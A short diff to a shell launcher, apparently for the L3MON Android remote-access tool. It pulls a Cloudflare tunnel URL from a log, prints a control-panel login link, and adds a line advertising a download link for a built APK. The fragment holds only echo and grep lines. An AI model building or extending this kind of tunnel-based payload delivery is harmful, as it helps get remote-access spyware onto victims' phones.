@@ -21,3 +21,4 @@ sleep 10
 cdf=$(cat /L3MON/ngrok/.cf.log | grep -o 'https://[-0-9a-z]*\.trycloudflare.com')
 echo -e "$Green \b[$IGreen \bOK$Green \b]$Cyan LOGIN CLOUD Resumed Link:$Green =$IYellow $cdf"
           
+echo -e "$Green \b[$IGreen \bOK$Green \b]$Cyan APK Downlod Link Resumed:$Green =$IYellow $cdf/build.s.apk"
